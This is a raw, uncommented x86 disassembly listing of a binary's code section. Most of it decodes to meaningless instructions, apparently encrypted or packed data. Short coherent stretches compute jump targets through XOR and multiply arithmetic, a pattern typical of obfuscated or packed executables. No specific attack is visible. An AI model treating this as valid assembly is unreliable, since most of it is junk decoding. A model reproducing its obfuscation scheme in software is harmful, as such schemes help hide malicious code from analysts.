  404226:	mov    al,0x1d
  404228:	jbe    0x4041e3
  40422a:	add    DWORD PTR [ebx-0x16f9de3],ecx
  404230:	sub    DWORD PTR [edx],edx
  404232:	js     0x404281
  404234:	cmp    DWORD PTR [edi-0x22],edx
  404237:	ret    0x189f
  40423a:	arpl   WORD PTR [edi+eiz*4],dx
  40423d:	or     al,0x46
  40423f:	hlt    
  404240:	cli    
  404241:	inc    edx
  404242:	jae    0x4041fe
  404244:	mov    ss:0x1e681b59,al
  40424a:	lea    esi,[ebx-0x7cc2fcd]
  404250:	jmp    0x4043fa
  404255:	xchg   ebp,eax
  404256:	push   0xffffffb8
  404258:	int3   
  404259:	jns    0x404237
  40425b:	imul   eax,DWORD PTR gs:[ebp+eax*4+0x27],0x15
  404261:	jb     0x4042cb
  404263:	outs   dx,DWORD PTR ds:[esi]
  404264:	mov    esp,0x7e7e16ed
  404269:	mov    edi,DWORD PTR [edi+0x7e]
  40426c:	jle    0x40420e
  40426e:	shr    DWORD PTR [edi-0x5e2c52ae],cl
  404274:	test   BYTE PTR [ecx+0x64ed1e62],ah
  40427a:	push   ds
  40427b:	mov    ah,0x70
  40427d:	adc    bl,BYTE PTR [eax+0x5d36948f]
  404283:	xchg   ecx,eax
  404284:	cmp    eax,0xf86586f5
  404289:	mov    al,0x29
  40428b:	mov    esi,edx
  40428d:	jb     0x40422d
  40428f:	add    BYTE PTR [esi-0x67],bl
  404292:	push   0xffffffd4
  404294:	mov    ebp,0xadb6ec39
  404299:	aam    0x2
  40429b:	cld    
  40429c:	mov    ah,0x2d
  40429e:	jle    0x404245
  4042a0:	inc    ebx
  4042a1:	push   eax
  4042a2:	xor    eax,0xb930f1d
  4042a7:	xor    ecx,eax
  4042a9:	out    dx,al
  4042aa:	mov    esi,0xbd3592b2
  4042af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042b0:	cmc    
  4042b1:	fdivrp st(5),st
  4042b3:	loopne 0x40427c
  4042b5:	cmp    ch,BYTE PTR [esp+ebx*4+0x5c]
  4042b9:	push   ss
  4042ba:	and    ebp,esi
  4042bc:	cwde   
  4042bd:	xor    esi,esi
  4042bf:	or     al,0xd5
  4042c1:	or     BYTE PTR [edi],bl
  4042c3:	xchg   ah,al
  4042c5:	inc    edx
  4042c6:	and    esp,ebp
  4042c8:	cs dec edx
  4042ca:	inc    edi
  4042cb:	or     al,ch
  4042cd:	(bad)  
  4042ce:	dec    ebp
  4042cf:	mov    dl,0x41
  4042d1:	out    dx,eax
  4042d2:	jnp    0x40431f
  4042d4:	push   ebp
  4042d5:	mov    WORD PTR [edx-0x1a],gs
  4042d8:	(bad)  
  4042d9:	push   ss
  4042da:	adc    eax,0x57aefa8d
  4042df:	loope  0x4042c2
  4042e1:	in     eax,0x4f
  4042e3:	xchg   BYTE PTR [esi-0x1f63bb3c],cl
  4042e9:	xor    eax,0x403fa897
  4042ee:	dec    esp
  4042ef:	pop    es
  4042f0:	add    DWORD PTR [edi+0x57],0x4d
  4042f4:	and    al,0x4b
  4042f6:	ja     0x4042e4
  4042f8:	mov    DWORD PTR [esi-0x49e529b3],edi
  4042fe:	cmp    eax,0xc1a8b0da
  404303:	xor    eax,DWORD PTR [ecx]
  404305:	cmp    dh,dh
  404307:	inc    ecx
  404308:	inc    eax
  404309:	loope  0x40435b
  40430b:	mov    eax,0xf83c1a03
  404310:	leave  
  404311:	push   ebx
  404312:	retf   
  404313:	outs   dx,BYTE PTR ds:[esi]
  404314:	cli    
  404315:	rol    eax,0xda
  404318:	inc    ebp
  404319:	xchg   ebp,eax
  40431a:	(bad)  
  40431b:	lods   al,BYTE PTR ds:[esi]
  40431c:	fstp   DWORD PTR [ebx-0x3b]
  40431f:	adc    BYTE PTR [edi-0x5f3a6c7],0xe9
  404326:	or     DWORD PTR [esi-0x540fd54d],esp
  40432c:	ss mov al,0xbc
  40432f:	sbb    DWORD PTR [edi],eax
  404331:	mov    eax,DWORD PTR [esi]
  404333:	jmp    0xdb2:0x6a59a74e
  40433a:	test   al,0x68
  40433c:	or     eax,0x89bc0769
  404341:	ja     0x404369
  404343:	nop
  404344:	push   esi
  404345:	jae    0x4042fe
  404347:	sub    BYTE PTR [ecx],dl
  404349:	(bad)  
  40434a:	fld    TBYTE PTR [esp+ebp*4-0x16]
  40434e:	push   eax
  40434f:	sbb    BYTE PTR [bp+si+0x5350],al
  404354:	outs   dx,DWORD PTR ds:[esi]
  404355:	lods   al,BYTE PTR ds:[esi]
  404356:	pop    ds
  404357:	jno    0x4043d1
  404359:	mov    edi,0x6d99fa8e
  40435e:	mov    al,ds:0xdfc581e0
  404363:	mov    dh,0xdc
  404365:	xchg   DWORD PTR [ebp+edx*1-0x7f],edx
  404369:	cmp    eax,0x53afccaf
  40436e:	cmp    ah,al
  404370:	cs stos BYTE PTR es:[edi],al
  404372:	add    al,0x88
  404374:	mov    eax,0x4505f664
  404379:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40437a:	sbb    eax,0xb3524a4f
  40437f:	pop    ds
  404380:	leave  
  404381:	pushf  
  404382:	popa   
  404383:	(bad)  
  404384:	fdivr  QWORD PTR [ebp+0x31]
  404387:	cmp    DWORD PTR [edx],ecx
  404389:	das    
  40438a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40438b:	dec    edx
  40438c:	fistp  DWORD PTR [esi-0x49]
  40438f:	jb     0x404379
  404391:	call   0xc016e2e1
  404396:	push   ecx
  404397:	(bad)  
  404398:	jmp    0xb0ec:0x690ba78f
  40439f:	lods   al,BYTE PTR ds:[esi]
  4043a0:	and    DWORD PTR [eax],ecx
  4043a2:	or     al,0xe6
  4043a4:	push   ds
  4043a5:	aad    0xba
  4043a7:	fdivrp st(7),st
  4043a9:	das    
  4043aa:	sub    al,0x9
  4043ac:	std    
  4043ad:	cmp    al,0xe8
  4043af:	div    DWORD PTR [ecx-0x285dc7d4]
  4043b5:	inc    eax
  4043b6:	repnz xchg esi,eax
  4043b8:	jge    0x40442b
  4043ba:	lahf   
  4043bb:	inc    ecx
  4043bc:	sub    BYTE PTR [edi-0x2b],cl
  4043bf:	sahf   
  4043c0:	test   DWORD PTR [edi+0xff77fe7],esp
  4043c6:	cmp    edi,eax
  4043c8:	ret    0x7c01
  4043cb:	ins    DWORD PTR es:[edi],dx
  4043cc:	shl    DWORD PTR [edx+0x4d],1
  4043cf:	mov    esp,0x248e4f39
  4043d4:	mov    ecx,0x7db5cd3b
  4043d9:	add    edi,edi
  4043db:	jge    0x404416
  4043dd:	dec    esi
  4043de:	das    
  4043df:	jae    0x4043e0
  4043e1:	push   eax
  4043e2:	ja     0x40443b
  4043e4:	mov    esi,0xda9c4569
  4043e9:	and    BYTE PTR [edx+0x85639fd],0x8a
  4043f0:	xor    DWORD PTR [ebp-0x2c76fe58],0x46f3f580
  4043fa:	add    edi,ecx
  4043fc:	add    edx,ecx
  4043fe:	imul   edx,edi
  404401:	mov    edi,DWORD PTR [ebp-0x8]
  404404:	mov    ebx,DWORD PTR [ebp-0x10]
  404407:	sub    ebx,edi
  404409:	cmp    ebx,edx
  40440b:	ja     0x404419
  404411:	mov    edx,DWORD PTR [ebp-0x30]
  404414:	jmp    0x404613
  404419:	mov    edx,DWORD PTR [ebp-0x38]
  40441c:	mov    edi,DWORD PTR [ebp-0x4]
  40441f:	xor    edx,eax
  404421:	xor    edi,eax
  404423:	add    edi,ecx
  404425:	add    edx,ecx
  404427:	imul   edx,edi
  40442a:	mov    edi,DWORD PTR [ebp-0x8]
  40442d:	mov    ebx,DWORD PTR [ebp-0x10]
  404430:	sub    ebx,edi
  404432:	cmp    ebx,edx
  404434:	ja     0x4045ec
  40443a:	jmp    0x4045e4
  40443f:	hlt    
  404440:	mov    ah,0xbf
  404442:	add    bh,BYTE PTR [edi+0x42444505]
  404448:	pop    ecx
  404449:	mov    ds:0x3ff8d4df,al
  40444e:	hlt    
  40444f:	jp     0x404468
  404451:	jle    0x4044d1
  404453:	mov    edi,DWORD PTR [edi+0x7e]
  404456:	jle    0x404412
  404458:	shr    BYTE PTR [esi],cl
  40445a:	das    
  40445b:	pop    ebx
  40445d:	mov    al,ds:0xd1f958ce
  404462:	push   cs
  404463:	repz (bad) 
  404465:	inc    eax
  404466:	stos   BYTE PTR es:[edi],al
  404467:	jnp    0x404416
  404469:	repz ja 0x4044a2
  40446c:	dec    edx
  40446d:	jle    0x4044dd
  40446f:	cld    
  404470:	dec    ebx
  404471:	int3   
  404472:	adc    DWORD PTR [eax-0x2b],edi
  404475:	mov    DWORD PTR [ecx+ebx*4+0x53],esp
  404479:	mov    dh,0xca
  40447b:	jecxz  0x404462
  40447d:	pop    edi
  40447e:	jle    0x4044ab
  404480:	cwde   
  404481:	scas   al,BYTE PTR es:[edi]
  404482:	sub    esi,esi
  404484:	(bad)  
  404485:	sub    DWORD PTR [edi-0x49cb8828],ecx
  40448b:	cmc    
  40448c:	imul   ecx,DWORD PTR [eax],0x2d
  40448f:	scas   eax,DWORD PTR es:[edi]
  404490:	and    ebx,DWORD PTR ds:0x5bd536c7
  404496:	lahf   
  404497:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404498:	lods   eax,DWORD PTR ds:[esi]
  404499:	pop    esi
  40449a:	mov    BYTE PTR [eax-0x23],0x9
  40449e:	pop    ecx
  40449f:	(bad)  [edi]
  4044a1:	hlt    
  4044a2:	mov    ebx,0xb96da3ff
  4044a7:	mov    dh,0xd7
  4044a9:	inc    edx
  4044aa:	pop    es
  4044ab:	(bad)  
  4044ad:	add    BYTE PTR [ebp+edi*1+0x49],ch
  4044b1:	sub    dh,cl
  4044b3:	int3   
  4044b4:	mov    esi,0xb989a93e
  4044b9:	ret    0x4c05
  4044bc:	sub    BYTE PTR [edx],ch
  4044be:	arpl   WORD PTR es:[ecx],ax
  4044c1:	iret   
  4044c2:	sbb    dh,BYTE PTR [ecx+0x11554416]
  4044c8:	sub    BYTE PTR [edi],bl
  4044ca:	dec    edx
  4044cb:	adc    al,0xf7
  4044cd:	retf   0x500d
  4044d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044d1:	pop    ss
  4044d2:	out    0x9d,eax
  4044d4:	sahf   
  4044d5:	ss jbe 0x404485
  4044d8:	fnsave [eax]
  4044da:	add    BYTE PTR [ecx-0xe99073e],ah
  4044e0:	std    
  4044e1:	pop    ds
  4044e2:	pop    esi
  4044e3:	adc    al,0xd3
  4044e5:	das    
  4044e6:	retf   
  4044e7:	fs jg  0x4044ab
  4044ea:	mov    al,ds:0x960010a9
  4044ef:	popa   
  4044f0:	xchg   ebx,eax
  4044f1:	outs   dx,BYTE PTR ds:[esi]
  4044f2:	cs jb  0x4044f3
  4044f5:	pop    esi
  4044f6:	jbe    0x4044b2
  4044f8:	retf   0x54bd
  4044fb:	adc    BYTE PTR [esi],bl
  4044fd:	mov    ebp,0xc1ce508b
  404502:	dec    ebp
  404503:	call   0xd0b7:0xd6941d4a
  40450a:	aam    0xa0
  40450c:	inc    ecx
  40450d:	loope  0x404585
  40450f:	push   ds
  404510:	mov    ?,WORD PTR [edi-0x43226bf5]
  404516:	add    al,0x65
  404518:	jge    0x4044a7
  40451a:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40451c:	sbb    esi,DWORD PTR [ebx-0x79cc6847]
  404522:	adc    ebx,ebp
  404524:	inc    eax
  404525:	inc    DWORD PTR [edx]
  404527:	es in  al,0x1f
  40452a:	(bad)  
  40452c:	pop    ebp
  40452d:	out    dx,eax
  40452e:	and    DWORD PTR [ecx],ebx
  404530:	dec    edx
  404531:	test   BYTE PTR [ecx+0x554f277d],al
  404537:	jmp    0xe19213af
  40453c:	aad    0x7b
  40453e:	sub    ebp,DWORD PTR [ecx-0x5d]
  404541:	add    bl,dl
  404543:	test   BYTE PTR [ebp-0x6],ch
  404546:	jne    0x404532
  404548:	fisub  WORD PTR [eax+0x5ab2ca99]
  40454e:	adc    DWORD PTR [edx+0x5ca8bcfe],ebx
  404554:	and    eax,0x556b4c30
  404559:	add    BYTE PTR [ebp-0x75],dl
  40455c:	push   edi
  40455d:	rol    DWORD PTR [esi-0x166837e4],cl
  404563:	imul   esi,DWORD PTR [ebp+0x1e0f979a],0xcc111ed6
  40456d:	jg     0x404566
  40456f:	retf   
  404570:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404571:	(bad)  
  404572:	(bad)  [ebp-0x4127733]
  404578:	sub    al,0x66
  40457a:	lods   al,BYTE PTR ds:[esi]
  40457b:	or     bl,al
  40457d:	xchg   esp,eax
  40457e:	mov    ds:0x19a0fd22,eax
  404583:	enter  0x79d7,0xd2
  404587:	test   edi,0x55bf4b17
  40458d:	xor    dl,BYTE PTR ds:0xbb274729
  404593:	cwde   
  404594:	push   edi
  404595:	push   eax
  404596:	inc    eax
  404597:	out    0xc7,eax
  404599:	xchg   edi,eax
  40459a:	inc    edi
  40459b:	data16 sahf 
  40459d:	mov    dl,0xfe
  40459f:	cmc    
  4045a0:	mov    ebp,0xde536b8d
  4045a5:	in     al,0xe2
  4045a7:	adc    bh,al
  4045a9:	push   0xffffffc4
  4045ab:	out    dx,eax
  4045ac:	add    BYTE PTR [ecx+0x17c57387],0x10
  4045b3:	dec    edi
  4045b4:	ret    0x7f18
  4045b7:	sbb    al,BYTE PTR [ebx-0x12]
  4045ba:	fwait
  4045bb:	push   eax
  4045bc:	aam    0xce
  4045be:	repz pop ebx
  4045c0:	adc    eax,0x92d9a0e
  4045c5:	mov    bl,0x39
  4045c7:	sub    BYTE PTR [edi+0x22],ah
  4045ca:	rcr    BYTE PTR [edi+0xcf75d06],0x19
  4045d1:	push   ecx
  4045d2:	sar    cl,cl
  4045d4:	and    eax,0x67c3f03f
  4045d9:	out    dx,al
  4045da:	jnp    0x4045df
  4045dc:	mov    al,ds:0x99b88af6
  4045e1:	bound  edi,QWORD PTR [ecx-0x33aa7460]
  4045e7:	jmp    0x404613
  4045ec:	mov    edx,DWORD PTR [ebp-0x3c]
  4045ef:	mov    edi,DWORD PTR [ebp-0x4]
  4045f2:	xor    edx,eax
  4045f4:	xor    edi,eax
  4045f6:	add    edx,ecx
  4045f8:	add    edi,ecx
  4045fa:	imul   edx,edi
  4045fd:	mov    edi,DWORD PTR [ebp-0x8]
  404600:	mov    ebx,DWORD PTR [ebp-0x10]
  404603:	sub    ebx,edi
  404605:	cmp    ebx,edx
  404607:	mov    edx,DWORD PTR [ebp-0x38]
  40460a:	jbe    0x404613
  404610:	mov    edx,DWORD PTR [ebp-0x3c]
  404613:	mov    edi,DWORD PTR [ebp-0x4]
  404616:	xor    edi,eax
  404618:	xor    edx,eax
  40461a:	add    edi,ecx
  40461c:	add    edx,ecx
  40461e:	imul   edx,edi
  404621:	mov    DWORD PTR [ebp+0xc],edx
  404624:	mov    edx,DWORD PTR [ebp+0xc]
  404627:	mov    DWORD PTR [ebp-0x24],edx
  40462a:	mov    edx,DWORD PTR [ebp-0x8]
  40462d:	add    edx,DWORD PTR [ebp-0x40]
  404630:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  404637:	mov    DWORD PTR [ebp-0x1c],edx
  40463a:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  404641:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  404648:	mov    edx,DWORD PTR [ebp-0x18]
  40464b:	xor    edx,eax
  40464d:	add    edx,ecx
  40464f:	jmp    0x404d64
  404654:	mov    edx,DWORD PTR [ebp-0x18]
  404657:	jmp    0x404801
  40465c:	dec    esi
  40465d:	(bad)  
  40465e:	(bad)  
  40465f:	push   edi
  404660:	dec    esi
  404661:	push   edi
  404662:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  404664:	xor    BYTE PTR [edx+0x2319bf30],al
  40466a:	cli    
  40466b:	pop    ebx
  40466c:	imul   DWORD PTR [ecx]
  40466e:	jle    0x4046ee
  404670:	mov    edi,DWORD PTR [edi+0x7e]
  404673:	jle    0x404675
  404675:	scas   al,BYTE PTR es:[edi]
  404676:	jb     0x4046d8
  404678:	(bad)  
  404679:	push   cs
  40467a:	pop    edx
  40467b:	fimul  DWORD PTR [edi+0x42]
  40467e:	fwait
  40467f:	sbb    dh,BYTE PTR [edx+ebp*8+0x16]
  404683:	push   es
  404684:	(bad)  
  404685:	imul   eax,esp,0x7ddb44ad
  40468b:	outs   dx,DWORD PTR ds:[esi]
  40468c:	mov    ds:0x9579a5b6,al
  404691:	call   0x16cf:0x5b127031
  404698:	ficomp DWORD PTR [ecx-0x5a]
  40469b:	mov    ds:0xcc09684a,eax
  4046a0:	fadd   DWORD PTR [esi-0x6bd761d9]
  4046a6:	pop    ecx
  4046a7:	(bad)
  4046aa:	outs   dx,BYTE PTR ds:[esi]
  4046ab:	mov    ecx,0xeaca01b7
  4046b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046b1:	lods   eax,DWORD PTR ds:[esi]
  4046b2:	sbb    edx,ebx
  4046b4:	dec    eax
  4046b5:	push   ebp
  4046b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046b7:	sub    eax,0xf4efc4fb
  4046bc:	and    dl,BYTE PTR fs:[edx+ecx*4+0x497cc666]
  4046c4:	mov    eax,eax
  4046c6:	popf   
  4046c7:	jp     0x40468b
  4046c9:	hlt    
  4046ca:	xchg   BYTE PTR [ebx],dh
  4046cc:	push   ss
  4046cd:	push   esi
  4046ce:	(bad)  
  4046cf:	repnz cs and al,0x18
  4046d3:	les    edx,FWORD PTR ds:0xca90be7f
  4046d9:	test   ch,dh
  4046db:	pop    esi
  4046dc:	sub    ecx,ebx
  4046de:	cmp    eax,0x15dfcbad
  4046e3:	or     al,0xc2
  4046e5:	mov    ds:0xbe136723,eax
  4046ea:	add    BYTE PTR [ebx+ebx*4-0x67f93a1c],0xb9
  4046f2:	addr16 dec ebx
  4046f4:	mov    ds:0x42ffe2b7,eax
  4046f9:	dec    edi
  4046fa:	jmp    0x8468:0xaff549ab
  404701:	rol    BYTE PTR [ebp+0x28],0x4a
  404705:	repnz push 0x5
  404708:	lds    ecx,FWORD PTR [edx+eax*8-0x43]
  40470c:	test   BYTE PTR [ecx-0x1f],cl
  40470f:	shl    bl,1
  404711:	js     0x40472f
  404713:	pop    ebp
  404714:	xor    bh,dl
  404716:	mov    ds:0x6c6346c2,al
  40471b:	iret   
  40471c:	test   al,0xec
  40471e:	(bad)  
  40471f:	sub    DWORD PTR [ebp+ebp*2-0x33],esp
  404723:	mov    ebx,0x84726103
  404728:	cwde   
  404729:	xchg   edx,eax
  40472a:	xor    al,0xe1
  40472c:	sbb    al,0xc1
  40472e:	push   ebx
  40472f:	sbb    al,0xe4
  404731:	das    
  404732:	pop    ss
  404733:	and    al,0xa7
  404735:	fucom  st(3)
  404737:	loop   0x404721
  404739:	push   ebp
  40473a:	sbb    al,0x9d
  40473c:	push   cs
  40473d:	cdq    
  40473e:	mov    fs:0xef222407,al
  404744:	sub    ecx,DWORD PTR [esp+eiz*2-0x7d0fe7d7]
  40474b:	ror    DWORD PTR [ecx],cl
  40474d:	mov    al,0xbf
  40474f:	xchg   DWORD PTR [ebp+ebx*2-0x52],edx
  404753:	dec    edi
  404754:	add    BYTE PTR [edi-0x51c3fc43],ch
  40475a:	mov    cl,0xe7
  40475c:	mov    DWORD PTR [edx+0xb],eax
  40475f:	and    edi,ecx
  404761:	pushf  
  404762:	push   DWORD PTR [eax+0x4d]
  404765:	and    edx,DWORD PTR [ecx+0x30146bf1]
  40476b:	ss cs test eax,0x73bc88af
  404772:	dec    edx
  404773:	popa   
  404774:	jge    0x40473a
  404776:	and    eax,DWORD PTR [edi+ecx*2+0x4d]
  40477a:	jle    0x40470d
  40477c:	outs   dx,BYTE PTR ds:[esi]
  40477d:	repnz mov bl,BYTE PTR [esi]
  404780:	adc    eax,0x8112d926
  404785:	or     eax,0x9d4974ee
  40478a:	mov    ah,0xa8
  40478c:	push   es
  40478d:	push   es
  40478e:	cmp    eax,DWORD PTR [esi+0x511b242b]
  404794:	jbe    0x4047c0
  404796:	and    DWORD PTR [ebp-0x25],ebx
  404799:	mov    ch,BYTE PTR [ebp+ebp*8+0x3d]
  40479d:	sub    BYTE PTR [ebx],0x40
  4047a0:	retf   0x11b5
  4047a3:	ja     0x404735
  4047a5:	scas   eax,DWORD PTR es:[edi]
  4047a6:	test   al,0xd0
  4047a8:	or     DWORD PTR [ecx],ecx
  4047aa:	add    DWORD PTR [edi+0x1d],eax
  4047ad:	cmp    eax,0xc1a45bfc
  4047b2:	xor    edi,0x60
  4047b5:	out    dx,al
  4047b6:	mov    bh,0x1d
  4047b8:	imul   ebp,eax,0x30
  4047bb:	sbb    BYTE PTR [ecx-0x7212cb53],bh
  4047c1:	push   cs
  4047c2:	push   di
  4047c4:	dec    edi
  4047c5:	mov    dl,0x22
  4047c7:	ret    
  4047c8:	mov    ds:0x5f7532ef,al
  4047cd:	test   BYTE PTR [ecx+eiz*4+0x1e],cl
  4047d1:	ja     0x40481e
  4047d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047d4:	mov    ss,WORD PTR [esi-0x60efb048]
  4047da:	lahf   
  4047db:	test   BYTE PTR [esi+edi*2],bl
  4047de:	idiv   DWORD PTR [ebx-0x53771afa]
  4047e4:	pushf  
  4047e5:	daa    
  4047e6:	sar    cl,0x51
  4047e9:	mov    ebp,0x8ce2a6cc
  4047ee:	sub    al,0xed
  4047f0:	xor    DWORD PTR [ebx-0x3443cbfc],ebx
  4047f6:	adc    BYTE PTR [esi-0x5],cl
  4047f9:	mov    ch,0x7c
  4047fb:	cmp    bh,BYTE PTR [edx]
  4047fd:	lea    ecx,[ecx]
  4047ff:	inc    esi
  404800:	xchg   ebx,eax
  404801:	xor    edx,eax
  404803:	add    edx,DWORD PTR [ebp-0x14]
  404806:	mov    edi,DWORD PTR [ebp-0x1c]
  404809:	mov    dl,BYTE PTR [edx+edi*1+0x32729d]
  404810:	mov    BYTE PTR [ebp+0xf],dl
  404813:	mov    edx,DWORD PTR [ebp-0xc]
  404816:	jmp    0x4049c0
  40481b:	and    BYTE PTR [esi+0x5a2a321e],0x62
  404822:	add    WORD PTR [edx-0x779e0f46],0x4f
  40482a:	xchg   DWORD PTR [ebx+ebp*1],eax
  40482d:	jle    0x4048ad
  40482f:	mov    edi,DWORD PTR [edi+0x7e]
  404832:	jle    0x404800
  404834:	mov    BYTE PTR [ebp+0x39],dl
  404837:	sub    eax,0x8d9be165
  40483c:	test   al,0x22
  40483e:	lods   eax,DWORD PTR ds:[esi]
  40483f:	(bad)  
  404840:	xchg   ebx,eax
  404841:	aam    0x8
  404843:	test   BYTE PTR [ecx],al
  404845:	pop    ss
  404846:	xor    DWORD PTR [ebx],ecx
  404848:	jno    0x40482b
  40484a:	mov    ebx,0xcebf5870
  40484f:	sbb    al,BYTE PTR [edi+eax*2]
  404852:	mov    ebp,0x210bbfd4
  404857:	dec    esp
  404858:	jb     0x4047ea
  40485a:	lahf   
  40485b:	inc    eax
  40485c:	popa   
  40485d:	retf   0xed04
  404860:	into   
  404861:	and    DWORD PTR [edi],ebx
  404863:	jae    0x40485b
  404865:	mov    al,0xe
  404867:	hlt    
  404868:	add    eax,ebx
  40486a:	sbb    eax,0xb0a329b7
  40486f:	and    eax,DWORD PTR [ecx-0x7c]
  404872:	lods   al,BYTE PTR ds:[esi]
  404873:	fisttp WORD PTR [edx+0x3f]
  404876:	test   eax,0x2fe4fede
  40487b:	mov    edi,0xd16c9bdb
  404880:	and    ebx,DWORD PTR [eax]
  404882:	fld    st(1)
  404884:	(bad)  
  404885:	fsub   st(1),st
  404887:	and    bp,WORD PTR [edx]
  40488a:	mov    eax,?
  40488c:	add    DWORD PTR [ecx+ebp*4-0x4832fba2],edx
  404893:	sub    DWORD PTR [eax],edi
  404895:	dec    ebp
  404896:	dec    edx
  404897:	int3   
  404898:	dec    edi
  404899:	loope  0x404873
  40489b:	adc    edi,DWORD PTR [ebx]
  40489d:	xlat   BYTE PTR ds:[ebx]
  40489e:	inc    ebx
  40489f:	inc    DWORD PTR [eax+0x727dd76a]
  4048a5:	mov    ah,0xbc
  4048a7:	in     eax,dx
  4048a8:	or     dl,0x44
  4048ab:	jo     0x40489d
  4048ad:	out    dx,al
  4048ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048af:	add    eax,0x3fab6781
  4048b4:	test   bl,bh
  4048b6:	jl     0x4048d8
  4048b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048b9:	pop    edx
  4048ba:	pop    es
  4048bb:	and    DWORD PTR [ebx-0x13],ecx
  4048be:	push   esi
  4048bf:	ret    
  4048c0:	mov    ecx,0x3e9db64e
  4048c5:	ds mov edx,0x40cc0dbc
  4048cb:	pushf  
  4048cc:	xor    DWORD PTR fs:[ebx+0x10],0x59
  4048d1:	sbb    al,0x72
  4048d3:	jno    0x404879
  4048d5:	mov    ebx,0x2ba8fd8f
  4048da:	push   esp
  4048db:	xchg   esi,eax
  4048dc:	mov    esp,0x8658655
  4048e1:	retf   0x770a
  4048e4:	call   0x2fc:0xeb43c5fa
  4048eb:	fwait
  4048ec:	cdq    
  4048ed:	pop    edx
  4048ee:	ins    BYTE PTR es:[edi],dx
  4048ef:	xchg   edi,eax
  4048f0:	jle    0x4048c2
  4048f2:	jbe    0x4048ee
  4048f4:	dec    edi
  4048f5:	mul    BYTE PTR [ecx*4-0x7266b9a9]
  4048fc:	inc    eax
  4048fd:	jmp    0x12a5:0x36a3f0b5
  404904:	cld    
  404905:	xor    esi,DWORD PTR [eax+ebx*4-0x7c22d283]
  40490c:	mov    ah,0xc3
  40490e:	or     esi,ecx
  404910:	repnz or cl,dh
  404913:	add    eax,0x4adf52d2
  404918:	ins    BYTE PTR es:[edi],dx
  404919:	loope  0x4048ef
  40491b:	xchg   DWORD PTR [ebp-0x33],eax
  40491e:	cdq    
  40491f:	jnp    0x4048b2
  404921:	push   esi
  404922:	cmp    BYTE PTR [edx-0x48],al
  404925:	cli    
  404926:	(bad)  
  404927:	dec    BYTE PTR [edi-0x7c4d5d5d]
  40492d:	clc    
  40492e:	div    bl
  404930:	shl    DWORD PTR [ecx+ecx*4+0x60fe0f2c],0xf4
  404938:	retf   0xd3b1
  40493b:	or     BYTE PTR ds:0x77bd8dbd,0xf7
  404942:	ret    0x95d0
  404945:	out    dx,eax
  404946:	mov    DWORD PTR [edi-0x62aefb59],eax
  40494c:	xchg   BYTE PTR [eax+0x43],bh
  40494f:	sti    
  404950:	push   ecx
  404951:	jnp    0x40495d
  404953:	or     eax,0x909f4469
  404958:	pusha  
  404959:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40495a:	sbb    eax,0x3974f586
  40495f:	jb     0x40498c
  404961:	inc    esp
  404962:	or     eax,0xb908e36e
  404967:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404968:	mov    eax,ds:0x80d9923b
  40496d:	mov    esi,0x1a47c00e
  404972:	mov    ebx,0x4c86144
  404977:	cmp    DWORD PTR [ecx],0x152336d2
  40497d:	dec    edx
  40497e:	aad    0xfa
  404980:	jecxz  0x404928
  404982:	cmp    DWORD PTR [ebp-0x21],0x4f8c52aa
  404989:	add    DWORD PTR [eax-0x9],ebp
  40498c:	jecxz  0x404942
  40498e:	sbb    ebp,ebp
  404990:	shl    DWORD PTR [eax+0x70],1
  404993:	mov    ds:0xdb6694f9,al
  404998:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404999:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40499a:	mov    DWORD PTR [edx+edi*1-0x5a],ebp
  40499e:	shl    ebx,cl
  4049a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049a1:	lea    esi,[edi+edi*8+0x7cb048bf]
  4049a8:	jns    0x4049c6
  4049aa:	mov    dl,0x3a
  4049ac:	hlt    
  4049ad:	push   es
  4049ae:	mov    ds:0x5913febb,al
  4049b3:	lahf   
  4049b4:	sub    edx,DWORD PTR [esi]
  4049b6:	mov    WORD PTR [esi+esi*4],fs
  4049b9:	aam    0x54
  4049bb:	push   ss
  4049bc:	inc    esi
  4049bd:	xchg   eax,ebx
  4049bf:	inc    esi
  4049c0:	xor    edx,eax
  4049c2:	add    edx,DWORD PTR [ebp-0x14]
  4049c5:	jmp    0x404b6f
  4049ca:	test   BYTE PTR [ebp-0x13],cl
  4049cd:	xor    edi,ebp
  4049cf:	push   ebx
  4049d0:	mov    esp,0xd1280b5d
  4049d5:	xor    ebp,edi
  4049d7:	add    ch,BYTE PTR [ebx]
  4049d9:	nop
  4049da:	xchg   ecx,eax
  4049db:	sub    al,0x7e
  4049dd:	jle    0x40496a
  4049df:	jg     0x404a5f
  4049e1:	jle    0x4049fb
  4049e3:	jmp    0x4627:0x39076c7f
  4049ea:	pop    esp
  4049eb:	mov    eax,0x4b451b44
  4049f0:	xor    ebx,esp
  4049f2:	repnz fimul WORD PTR [eax]
  4049f5:	stos   BYTE PTR es:[edi],al
  4049f6:	les    ecx,FWORD PTR [edi]
  4049f8:	aaa    
  4049f9:	pop    ebp
  4049fa:	test   BYTE PTR [eax+eiz*2-0x73],0x5c
  4049ff:	mov    ah,0x23
  404a01:	dec    ebp
  404a02:	in     al,dx
  404a03:	xlat   BYTE PTR ds:[ebx]
  404a04:	lock repnz mov esi,0x4586e1c
  404a0b:	jl     0x404a40
  404a0d:	imul   ecx,eax,0x7d846b80
  404a13:	push   esi
  404a14:	xchg   al,ch
  404a16:	in     al,0x3e
  404a18:	add    BYTE PTR [ebx],bh
  404a1a:	mov    esi,0xb11aeb99
